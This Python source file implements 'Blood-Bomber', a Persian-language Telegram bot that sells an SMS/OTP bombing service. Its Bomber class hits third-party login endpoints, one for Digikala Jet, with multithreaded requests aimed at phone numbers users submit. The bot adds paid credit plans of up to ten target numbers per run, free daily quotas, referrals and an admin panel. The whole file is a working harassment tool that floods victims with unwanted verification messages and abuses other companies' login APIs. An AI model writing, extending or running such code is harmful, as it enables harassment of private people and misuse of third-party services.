import random
import threading
import time
import requests
import os
import sqlite3
import telebot
from telebot import types
from flask import Flask
from datetime import datetime
import traceback

# ==========================================
# 1. وب‌سرور برای سلامت پورت (Render)
# ==========================================
app = Flask(__name__)
@app.route('/')
def health(): return "Bot is running!", 200

# ==========================================
# 2. تنظیمات و دیتابیس
# ==========================================
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = 6914309071
CARD_NUMBER = "[]" 
DB_FILE = "bot_database.db"
bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

bot.set_my_commands([
    types.BotCommand("start", "شروع ربات"),
    types.BotCommand("admin", "پنل مدیریت"),
    types.BotCommand("invite", "لینک دعوت"),
    types.BotCommand("help", "راهنما")
])

PANEL_IMAGE_URL = "https://i.imgur.com/Z7lvgzO.jpeg"
VIP_COST = 1000
WHEEL_COOLDOWN = 86400

CHANNEL_1 = "@BloodBomber_Chanel"
CHANNEL_2 = "@YourChannel2"

SERVICE_CONFIG = {
    "free":  {"name": "رایگان", "max_phones": 2,  "delay": 1.0, "max_daily": 3},
    "basic": {"name": "پایه",   "max_phones": 3,  "delay": 0.5, "max_daily": 999},
    "pro":   {"name": "حرفه‌ای","max_phones": 5,  "delay": 0.3, "max_daily": 999},
    "vip":   {"name": "ویژه (VIP)", "max_phones": 10, "delay": 0.1, "max_daily": 999}
}

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id TEXT PRIMARY KEY, name TEXT, plan TEXT, credits INTEGER, 
        last_daily REAL, sub_expiry REAL, daily_bomb_count INTEGER, last_bomb_date TEXT,
        total_purchases INTEGER DEFAULT 0, invites INTEGER DEFAULT 0,
        last_wheel_spin REAL DEFAULT 0)''')
    conn.commit()
    conn.close()
init_db()

def get_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row: return {"user_id": row[0], "name": row[1], "plan": row[2], "credits": row[3], "last_daily": row[4], "sub_expiry": row[5], "daily_bomb_count": row[6], "last_bomb_date": row[7], "total_purchases": row[8], "invites": row[9], "last_wheel_spin": row[10]}
    return None

def save_user(user_id, name, plan, credits, last_daily, sub_expiry, daily_bomb_count, last_bomb_date, total_purchases=0, invites=0, last_wheel_spin=0):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", 
              (user_id, name, plan, credits, last_daily, sub_expiry, daily_bomb_count, last_bomb_date, total_purchases, invites, last_wheel_spin))
    conn.commit()
    conn.close()

user_states, pending_approvals, active_bombers, active_gift_codes = {}, {}, {}, {}

PLANS = {
    "basic": {"name": "پایه (۱۰۰ اعتبار)", "price": 150, "credits": 100},
    "pro": {"name": "حرفه‌ای (۵۰۰ اعتبار)", "price": 450, "credits": 500},
    "vip": {"name": "ویژه (۱۲۰۰ اعتبار)", "price": 600, "credits": 1200}
}

# ==========================================
# 3. هسته بمبر (اصلاح‌شده)
# ==========================================
class Bomber:
    def __init__(self, phone_numbers, user_id, plan):
        self.phone_numbers = phone_numbers.split(",") if "," in phone_numbers else [phone_numbers]
        self.user_id = user_id
        self.plan = plan
        self.services = []
        self.load_services()
        self.session = requests.Session()
        self.stop_event = threading.Event()
        self.success = 0
        self.fail = 0
        self.total_services = len(self.services) * len(self.phone_numbers)

    def load_services(self):
        # ⚠️⚠️⚠️ لیست سرویس‌های خودت رو اینجا کپی کن ⚠️⚠️⚠️
        # دقت کن که data باید یک تابع باشد که phone را بگیرد
        self.services = [
            {'name': 'Digikala Jet', 'url': 'https://api.digikalajet.ir/user/login-register/', 'method': 'POST', 'data': lambda phone: {"phone": phone}, 'json': True},
            # بقیه سرویس‌ها ...
        ]

    def send_request(self, service, phone):
        if self.stop_event.is_set(): return
        try:
            data = service['data'](phone) # اصلاح: پاس دادن شماره به تابع
            headers = {'User-Agent': "Mozilla/5.0"}
            method = service['method'].upper()
            use_json = service.get('json', False)
            
            delay = SERVICE_CONFIG.get(self.plan, SERVICE_CONFIG["free"])["delay"]
            
            if method == 'POST':
                if use_json: resp = self.session.post(service['url'], json=data, headers=headers, timeout=5)
                else: resp = self.session.post(service['url'], data=data, headers=headers, timeout=5)
            else:
                resp = self.session.get(service['url'], params=data, headers=headers, timeout=5)
                
            if resp.status_code in (200, 201, 202, 204): self.success += 1
            else: self.fail += 1
        except Exception as e:
            self.fail += 1

    def worker(self, subset, phone):
        for service in subset:
            if self.stop_event.is_set(): break
            self.send_request(service, phone)
            time.sleep(SERVICE_CONFIG.get(self.plan, SERVICE_CONFIG["free"])["delay"])

    def start(self):
        if not self.services:
            bot.send_message(self.user_id, "لیست سرویس‌ها خالی است.")
            return
            
        self.success, self.fail = 0, 0
        chunk_size = max(1, len(self.services) // 15)
        threads = []
        
        # ارسال پیام اولیه نوار وضعیت
        status_msg = bot.send_message(self.user_id, f"⏳ **در حال ارسال...**\nمیزان پیشرفت: 0/{self.total_services}", parse_mode='Markdown')
        
        for phone in self.phone_numbers:
            if not phone.startswith("+"): phone = "+98" + phone.lstrip("0")
            chunks = [self.services[i:i + chunk_size] for i in range(0, len(self.services), chunk_size)]
            for chunk in chunks:
                t = threading.Thread(target=self.worker, args=(chunk, phone))
                t.start()
                threads.append(t)
                
        # آپدیت نوار وضعیت
        def update_status():
            last_update = time.time()
            while any(t.is_alive() for t in threads):
                if time.time() - last_update > 2:
                    done = self.success + self.fail
                    percent = int((done / self.total_services) * 100) if self.total_services > 0 else 0
                    bar = "█" * (percent // 10) + "░" * (10 - (percent // 10))
                    try:
                        bot.edit_message_text(
                            f"⏳ **در حال ارسال...**\n\n"
                            f"✅ موفق: {self.success}\n"
                            f"❌ ناموفق: {self.fail}\n\n"
                            f"📊 [{bar}] {percent}%\n"
                            f"میزان پیشرفت: {done}/{self.total_services}",
                            self.user_id, status_msg.message_id, parse_mode='Markdown'
                        )
                    except: pass
                    last_update = time.time()
                time.sleep(0.5)
                
        for t in threads: t.join()
        update_status()
        
        percent = int((self.success / self.total_services) * 100) if self.total_services > 0 else 0
        bot.edit_message_text(
            f"🏁 **گزارش نهایی:**\n\n"
            f"✅ موفق: {self.success}\n"
            f"❌ ناموفق: {self.fail}\n"
            f"📊 درصد موفقیت: {percent}%",
            self.user_id, status_msg.message_id, parse_mode='Markdown'
        )
        if self.user_id in active_bombers: del active_bombers[self.user_id]

# ==========================================
# 4. کیبوردها
# ==========================================
def get_reply_keyboard(is_admin=False):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        types.KeyboardButton("🆓 اجرای رایگان"),
        types.KeyboardButton("💎 اجرای اشتراکی")
    )
    markup.add(
        types.KeyboardButton("💳 خرید اعتبار"),
        types.KeyboardButton("📋 حساب کاربری")
    )
    markup.add(
        types.KeyboardButton("🎰 گردونه شانس"),
        types.KeyboardButton("🎁 جایزه روزانه")
    )
    markup.add(types.KeyboardButton("🏆 برترین‌ها"))
    if is_admin:
        markup.add(types.KeyboardButton("⚙️ پنل مدیریت"))
    return markup

def get_main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🆓 اجرای رایگان", callback_data="menu_bomb_free"),
        types.InlineKeyboardButton("💎 اجرای اشتراکی", callback_data="menu_bomb_sub")
    )
    markup.add(
        types.InlineKeyboardButton("💳 خرید اعتبار", callback_data="menu_buy"),
        types.InlineKeyboardButton("📋 حساب کاربری", callback_data="menu_profile")
    )
    markup.add(
        types.InlineKeyboardButton("🎰 گردونه شانس", callback_data="menu_wheel"),
        types.InlineKeyboardButton("🎁 جایزه روزانه", callback_data="menu_daily")
    )
    markup.add(types.InlineKeyboardButton("🏆 برترین‌ها", callback_data="menu_leaderboard"))
    markup.add(types.InlineKeyboardButton("🎧 پشتیبانی", callback_data="menu_support"))
    markup.add(types.InlineKeyboardButton("🔑 کد هدیه", callback_data="menu_gift"))
    return markup

# ==========================================
# 5. بررسی جوین اجباری
# ==========================================
def is_user_joined(user_id):
    try:
        member_1 = bot.get_chat_member(CHANNEL_1, user_id)
        if member_1.status not in ['member', 'administrator', 'creator']:
            return False
        if CHANNEL_2 and CHANNEL_2 != "@YourChannel2":
            member_2 = bot.get_chat_member(CHANNEL_2, user_id)
            if member_2.status not in ['member', 'administrator', 'creator']:
                return False
        return True
    except Exception as e:
        print(f"Join Check Error: {e}")
        return True

@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = str(message.from_user.id)
    
    if not is_user_joined(user_id):
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("📢 عضویت در کانال ۱", url=f"https://t.me/{CHANNEL_1.replace('@', '')}"))
        if CHANNEL_2 and CHANNEL_2 != "@YourChannel2":
            markup.add(types.InlineKeyboardButton("📢 عضویت در کانال ۲", url=f"https://t.me/{CHANNEL_2.replace('@', '')}"))
        markup.add(types.InlineKeyboardButton("✅ عضو شدم", callback_data="check_join"))
        bot.send_message(message.chat.id, "⚠️ **برای استفاده از ربات، ابتدا باید در کانال‌های ما عضو شوید!**", reply_markup=markup, parse_mode='Markdown')
        return
        
    user = get_user(user_id)
    
    args = message.text.split()
    if len(args) > 1 and args[1].startswith("ref_"):
        inviter_id = args[1].replace("ref_", "")
        if inviter_id != user_id:
            inviter = get_user(inviter_id)
            if inviter:
                inviter["invites"] += 1
                inviter["credits"] += 5
                save_user(**inviter)
                try: bot.send_message(inviter_id, f"🎉 یک نفر با لینک شما وارد شد! ۵ اعتبار هدیه گرفتید.")
                except: pass

    if not user:
        save_user(user_id, message.from_user.first_name, "free", 0, 0, 0, 0, "2000-01-01", 0, 0, 0)
        
    is_admin = (message.from_user.id == ADMIN_ID)
    bot_info = bot.get_me()
    bot_id = bot_info.id
    user_mention = f"[{message.from_user.first_name}](tg://user?id={user_id})"
    bot_mention = f"[Blood-Bomber](tg://user?id={bot_id})"
    
    caption = (
        f"سلام {user_mention} عزیز! 👋\n"
        f"به ربات **{bot_mention}** خوش آمدید.\n"
        "از منوی زیر برای شروع استفاده کنید:"
    )
    
    try:
        bot.send_photo(message.chat.id, PANEL_IMAGE_URL, caption=caption, reply_markup=get_reply_keyboard(is_admin), parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id, caption, reply_markup=get_reply_keyboard(is_admin), parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def check_join_callback(call):
    user_id = str(call.from_user.id)
    if is_user_joined(user_id):
        bot.answer_callback_query(call.id, "✅ شما عضو شدید!", show_alert=True)
        cmd_start(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ شما هنوز عضو نشده‌اید!", show_alert=True)

# ==========================================
# 6. پروفایل کامل
# ==========================================
@bot.message_handler(func=lambda message: message.text == "📋 حساب کاربری")
def kb_profile(message):
    user_id = str(message.from_user.id)
    user = get_user(user_id)
    if not user:
        bot.reply_to(message, "ابتدا /start کنید.")
        return
        
    plan_name = PLANS.get(user['plan'], {}).get('name', "رایگان")
    if user['plan'] == "free": plan_name = "🆓 رایگان"
    elif user['plan'] == "vip" and user['sub_expiry'] > time.time(): plan_name = "👑 ویژه (VIP)"
    else: plan_name = PLANS.get(user['plan'], {}).get('name', "بدون پلن")
        
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    text = (
        f"👤 **نام:** {user['name']}\n"
        f"🆔 **آیدی عددی:** `{user_id}`\n"
        f"📅 **تاریخ و ساعت:** `{current_time}`\n"
        f"👑 **نوع حساب:** **{plan_name}**\n"
        f"💰 **اعتبار:** **{user['credits']}**\n"
        f"👥 **دعوت‌ها:** **{user['invites']}**\n"
        f"📞 **شماره‌های مجاز هر بار:** **{SERVICE_CONFIG.get(user['plan'], SERVICE_CONFIG['free'])['max_phones']}**\n"
    )
    bot.reply_to(message, text, parse_mode='Markdown')

# ==========================================
# 7. هندلرهای اجرای سرویس‌ها
# ==========================================
@bot.message_handler(func=lambda message: message.text == "🆓 اجرای رایگان")
def kb_service_free(message):
    user_id = str(message.from_user.id)
    user = get_user(user_id)
    if not user:
        bot.reply_to(message, "ابتدا /start کنید.")
        return
        
    today = datetime.now().strftime("%Y-%m-%d")
    if user['last_bomb_date'] != today:
        user['last_bomb_date'] = today
        user['daily_bomb_count'] = 0
    if user['daily_bomb_count'] >= SERVICE_CONFIG["free"]["max_daily"]:
        bot.reply_to(message, f"❌ سهمیه رایگان امروز شما پر شده! حداکثر {SERVICE_CONFIG['free']['max_daily']} بار در روز.")
        return
        
    user_states[user_id] = {"state": "waiting_for_phone", "service": "free"}
    bot.reply_to(message, f"📞 **سرویس رایگان** (حداکثر {SERVICE_CONFIG['free']['max_phones']} شماره):\nشماره را وارد کنید:", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "💎 اجرای اشتراکی")
def kb_service_sub(message):
    user_id = str(message.from_user.id)
    user = get_user(user_id)
    if not user:
        bot.reply_to(message, "ابتدا /start کنید.")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("💎 پایه (۳ شماره)", callback_data="sub_basic"),
        types.InlineKeyboardButton("🔥 حرفه‌ای (۵ شماره)", callback_data="sub_pro"),
        types.InlineKeyboardButton("👑 VIP (۱۰ شماره)", callback_data="sub_vip")
    )
    bot.reply_to(message, "**نوع اشتراک خود را انتخاب کنید:**", reply_markup=markup, parse_mode='Markdown')

# ==========================================
# 8. خرید و سایر دکمه‌ها
# ==========================================
@bot.message_handler(func=lambda message: message.text == "💳 خرید اعتبار")
def kb_buy(message):
    text = "**پلن‌های اعتبار:**\n\n"
    markup = types.InlineKeyboardMarkup(row_width=1)
    for key, plan in PLANS.items():
        text += f"🔹 **{plan['name']}** | {plan['price']} تومان\n"
        markup.add(types.InlineKeyboardButton(f"خرید {plan['name']}", callback_data=f"buy_{key}"))
    bot.reply_to(message, text, reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "🎰 گردونه شانس")
def kb_wheel(message):
    user_id = str(message.from_user.id)
    user = get_user(user_id)
    if time.time() - user['last_wheel_spin'] < WHEEL_COOLDOWN:
        remaining = int(WHEEL_COOLDOWN - (time.time() - user['last_wheel_spin']))
        bot.reply_to(message, f"⏳ {remaining // 3600} ساعت دیگر.")
        return
    prize = random.choice([1, 2, 5, 10, 20, 50])
    user['credits'] += prize
    user['last_wheel_spin'] = time.time()
    save_user(**user)
    bot.reply_to(message, f"🎉 **تبریک!** شما **{prize}** اعتبار برنده شدید! 🎰")

@bot.message_handler(func=lambda message: message.text == "🎁 جایزه روزانه")
def kb_daily(message):
    user_id = str(message.from_user.id)
    user = get_user(user_id)
    if time.time() - user['last_daily'] < 86400:
        bot.reply_to(message, "⏳ امروز گرفته‌اید!")
    else:
        user['credits'] += 2
        user['last_daily'] = time.time()
        save_user(**user)
        bot.reply_to(message, "🎉 ۲ اعتبار رایگان!")

@bot.message_handler(func=lambda message: message.text == "🏆 برترین‌ها")
def kb_leaderboard(message):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT name, credits, user_id FROM users ORDER BY credits DESC LIMIT 5")
    rows = c.fetchall()
    conn.close()
    text = "**۵ کاربر برتر:**\n\n" + "".join([f"{i}. **{row[0]}** ➜ {row[1]} اعتبار\n" for i, row in enumerate(rows, 1)])
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "👑 پنل VIP")
def kb_vip(message):
    user_id = str(message.from_user.id)
    user = get_user(user_id)
    if user['plan'] == "vip" and user['sub_expiry'] > time.time():
        bot.reply_to(message, "شما هم اکنون VIP هستید!")
        return
    if user['credits'] >= VIP_COST:
        user['credits'] -= VIP_COST
        user['plan'] = "vip"
        user['sub_expiry'] = time.time() + (30 * 86400)
        save_user(**user)
        bot.reply_to(message, "🎉 تبریک! شما به باشگاه VIP پیوستید.")
    else:
        bot.reply_to(message, f"❌ نیاز: {VIP_COST} اعتبار.")

@bot.message_handler(func=lambda message: message.text == "🎧 پشتیبانی")
def kb_support(message):
    user_id = str(message.from_user.id)
    user_states[user_id] = {"state": "waiting_for_support"}
    bot.reply_to(message, "پیام خود را برای پشتیبانی بنویسید:")

@bot.message_handler(func=lambda message: message.text == "⚙️ پنل مدیریت" and message.from_user.id == ADMIN_ID)
def kb_admin(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 آمار کل", callback_data="admin_stats"),
        types.InlineKeyboardButton("📢 پیام همگانی", callback_data="admin_broadcast"),
        types.InlineKeyboardButton("🎁 شارژ همگانی", callback_data="admin_bulk_charge"),
        types.InlineKeyboardButton("📉 کسر همگانی", callback_data="admin_bulk_deduct"),
        types.InlineKeyboardButton("🔑 ساخت کد هدیه", callback_data="admin_gifts"),
        types.InlineKeyboardButton("👤 مشاهده کاربر", callback_data="admin_view_user"),
        types.InlineKeyboardButton("💾 دریافت بکاپ", callback_data="admin_backup")
    )
    bot.reply_to(message, "**پنل مدیریت**", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['admin'])
def cmd_admin(message):
    if message.from_user.id != ADMIN_ID: return
    kb_admin(message)

# ==========================================
# 9. هندلرهای منو (Callback Queries)
# ==========================================
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = str(call.from_user.id)
    user = get_user(user_id)
    
    if call.data == "menu_back":
        caption = "منوی اصلی:"
        try:
            bot.edit_message_media(types.InputMediaPhoto(PANEL_IMAGE_URL, caption=caption, parse_mode='Markdown'), call.message.chat.id, call.message.message_id, reply_markup=get_main_menu())
        except:
            bot.edit_message_text(caption, call.message.chat.id, call.message.message_id, reply_markup=get_main_menu(), parse_mode='Markdown')

    elif call.data == "menu_profile":
        plan_name = PLANS.get(user['plan'], {}).get('name', "رایگان")
        if user['plan'] == "free": plan_name = "🆓 رایگان"
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        text = (
            f"👤 **نام:** {user['name']}\n"
            f"🆔 **آیدی:** `{user_id}`\n"
            f"📅 **تاریخ:** `{current_time}`\n"
            f"👑 **نوع حساب:** **{plan_name}**\n"
            f"💰 **اعتبار:** **{user['credits']}**\n"
            f"👥 **دعوت‌ها:** **{user['invites']}**\n"
        )
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_buy":
        text = "**پلن‌های اعتبار:**\n\n"
        markup = types.InlineKeyboardMarkup(row_width=1)
        for key, plan in PLANS.items():
            text += f"🔹 **{plan['name']}** | {plan['price']} تومان\n"
            markup.add(types.InlineKeyboardButton(f"خرید {plan['name']}", callback_data=f"buy_{key}"))
        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data.startswith("buy_"):
        plan_key = call.data.replace("buy_", "")
        plan = PLANS[plan_key]
        user_states[user_id] = {"selected_plan": plan_key}
        text = f"✅ پلن **{plan['name']}** انتخاب شد.\n\n💳 مبلغ **{plan['price']} تومان** را واریز کنید:\n`{CARD_NUMBER}`\n\n📸 سپس **عکس رسید** را بفرستید."
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_buy"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_bomb_free":
        user_states[user_id] = {"state": "waiting_for_phone", "service": "free"}
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
        bot.edit_message_caption(f"📞 **سرویس رایگان**:\nشماره را وارد کنید:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_bomb_sub":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("💎 پایه (۳ شماره)", callback_data="sub_basic"),
            types.InlineKeyboardButton("🔥 حرفه‌ای (۵ شماره)", callback_data="sub_pro"),
            types.InlineKeyboardButton("👑 VIP (۱۰ شماره)", callback_data="sub_vip")
        )
        bot.edit_message_caption("**نوع اشتراک خود را انتخاب کنید:**", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data.startswith("sub_"):
        sub_type = call.data.replace("sub_", "")
        user_states[user_id] = {"state": "waiting_for_phone", "service": sub_type}
        max_phones = SERVICE_CONFIG[sub_type]["max_phones"]
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
        bot.edit_message_caption(f"📞 **سرویس {SERVICE_CONFIG[sub_type]['name']}** (حداکثر {max_phones} شماره):\nشماره را وارد کنید:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    # ادمین
    elif call.data == "admin_stats" and call.from_user.id == ADMIN_ID:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM users")
        total_users = c.fetchone()[0]
        c.execute("SELECT SUM(credits) FROM users")
        total_credits = c.fetchone()[0] or 0
        conn.close()
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, f"**آمار:**\n👥 کاربران: {total_users}\n💰 اعتبارها: {total_credits}", parse_mode='Markdown')

    elif call.data == "admin_bulk_charge" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "چند اعتبار به همه اضافه کنم؟ (عدد):")
        bot.register_next_step_handler(msg, process_bulk_charge)

    elif call.data == "admin_bulk_deduct" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "چند اعتبار از همه کم کنم؟ (عدد):")
        bot.register_next_step_handler(msg, process_bulk_deduct)

    elif call.data == "admin_gifts" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "فرمت: `CODE CREDITS`:")
        bot.register_next_step_handler(msg, process_make_gift)

    elif call.data == "admin_view_user" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "آیدی عددی کاربر:")
        bot.register_next_step_handler(msg, view_user_admin)

    elif call.data == "admin_backup" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        if os.path.exists(DB_FILE):
            with open(DB_FILE, 'rb') as f:
                bot.send_document(ADMIN_ID, f)

    elif call.data.startswith("admin_approve_"):
        req_id = call.data.replace("admin_approve_", "")
        if req_id in pending_approvals:
            data = pending_approvals[req_id]
            uid, plan_key = data["user_id"], data["plan"]
            plan = PLANS[plan_key]
            user_data = get_user(uid)
            if user_data:
                user_data["credits"] += plan["credits"]
                user_data["plan"] = plan_key
                user_data["total_purchases"] += 1
                save_user(**user_data)
                bot.send_message(uid, f"**پرداخت تایید شد!**\n**{plan['credits']}** اعتبار اضافه شد.", parse_mode='Markdown')
            bot.edit_message_text(f"✅ تایید شد.", call.message.chat.id, call.message.message_id)
            del pending_approvals[req_id]

    elif call.data.startswith("admin_reject_"):
        req_id = call.data.replace("admin_reject_", "")
        if req_id in pending_approvals:
            uid = pending_approvals[req_id]["user_id"]
            bot.edit_message_text("❌ رد شد.", call.message.chat.id, call.message.message_id)
            bot.send_message(uid, "❌ رسید شما رد شد.")
            del pending_approvals[req_id]

# ==========================================
# 10. دریافت ورودی‌ها
# ==========================================
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = str(message.from_user.id)
    if "selected_plan" not in user_states.get(user_id, {}):
        bot.reply_to(message, "ابتدا از منو یک پلن انتخاب کنید.")
        return
    plan_key = user_states[user_id]["selected_plan"]
    plan = PLANS[plan_key]
    req_id = f"{user_id}_{int(time.time())}"
    pending_approvals[req_id] = {"user_id": user_id, "plan": plan_key}
    bot.reply_to(message, "✅ رسید دریافت شد. منتظر تایید باشید.")
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ تایید", callback_data=f"admin_approve_{req_id}"),
        types.InlineKeyboardButton("❌ رد", callback_data=f"admin_reject_{req_id}")
    )
    bot.send_message(ADMIN_ID, f"📩 **رسید:**\nکاربر: `{user_id}`\nپلن: **{plan['name']}**", reply_markup=markup, parse_mode='Markdown')
    bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
    del user_states[user_id]

@bot.message_handler(func=lambda message: str(message.from_user.id) in user_states)
def process_text_inputs(message):
    user_id = str(message.from_user.id)
    state = user_states[user_id].get("state")
    service_type = user_states[user_id].get("service", "free")
    user = get_user(user_id)
    
    if message.text == "لغو":
        del user_states[user_id]
        bot.reply_to(message, "عملیات لغو شد.", reply_markup=get_main_menu())
        return
    
    if state == "waiting_for_support":
        bot.send_message(ADMIN_ID, f"🎧 پیام از `{user_id}`:\n\n{message.text}")
        bot.reply_to(message, "✅ پیام ارسال شد.")
        del user_states[user_id]

    elif state == "waiting_for_phone":
        phones = message.text.strip().replace(" ", "").split(",")
        max_phones = SERVICE_CONFIG.get(service_type, SERVICE_CONFIG["free"])["max_phones"]
        if len(phones) > max_phones:
            bot.reply_to(message, f"❌ حداکثر تعداد شماره برای این سرویس {max_phones} است.")
            return
        if any(len(p) < 10 or not p.isdigit() for p in phones):
            bot.reply_to(message, "❌ فرمت نامعتبر.")
            return
        
        if service_type == "free":
            today = datetime.now().strftime("%Y-%m-%d")
            if user['last_bomb_date'] != today:
                user['last_bomb_date'] = today
                user['daily_bomb_count'] = 0
            if user['daily_bomb_count'] + len(phones) > SERVICE_CONFIG["free"]["max_daily"]:
                bot.reply_to(message, "❌ سهمیه رایگان شما پر شده!")
                del user_states[user_id]
                return
            user['daily_bomb_count'] += len(phones)
        else:
            if user['credits'] < len(phones):
                bot.reply_to(message, "❌ اعتبار کافی ندارید!")
                del user_states[user_id]
                return
            user['credits'] -= len(phones)
            
        save_user(**user)
        del user_states[user_id]
        bot.reply_to(message, f"🚀 **شروع شد!** هدف: `{len(phones)}` شماره", parse_mode='Markdown')
        bomber = Bomber(",".join(phones), user_id, service_type)
        active_bombers[user_id] = bomber
        threading.Thread(target=bomber.start).start()

    elif state == "waiting_for_gift":
        code = message.text.strip().upper()
        del user_states[user_id]
        if code in active_gift_codes and active_gift_codes[code]["uses"] > 0:
            amount = active_gift_codes[code]["credits"]
            active_gift_codes[code]["uses"] -= 1
            user['credits'] += amount
            save_user(**user)
            bot.reply_to(message, f"{amount} اعتبار اضافه شد.")
        else:
            bot.reply_to(message, "❌ کد نامعتبر.")

# ==========================================
# 11. توابع کمکی
# ==========================================
def process_bulk_charge(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        amount = int(message.text.strip())
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("UPDATE users SET credits = credits + ?", (amount,))
        conn.commit()
        conn.close()
        bot.send_message(ADMIN_ID, f"✅ شارژ انجام شد.")
    except: pass

def process_bulk_deduct(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        amount = int(message.text.strip())
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("UPDATE users SET credits = MAX(0, credits - ?)", (amount,))
        conn.commit()
        conn.close()
        bot.send_message(ADMIN_ID, f"✅ کسر انجام شد.")
    except: pass

def process_make_gift(message):
    try:
        parts = message.text.split()
        active_gift_codes[parts[0].upper()] = {"uses": int(parts[1]), "credits": 5}
        bot.reply_to(message, f"✅ کد ساخته شد.")
    except: bot.reply_to(message, "❌ فرمت اشتباه.")

def view_user_admin(message):
    uid = message.text.strip()
    user = get_user(uid)
    if user:
        bot.reply_to(message, f"👤 {user['name']}\n👑 {user['plan']}\n💰 {user['credits']} اعتبار")
    else: bot.reply_to(message, "❌ کاربر یافت نشد.")

if __name__ == "__main__":
    try:
        threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)), use_reloader=False), daemon=True).start()
        print("🤖 Blood-Bomber is running...")
        bot.infinity_polling()
    except Exception as e:
        traceback.print_exc()
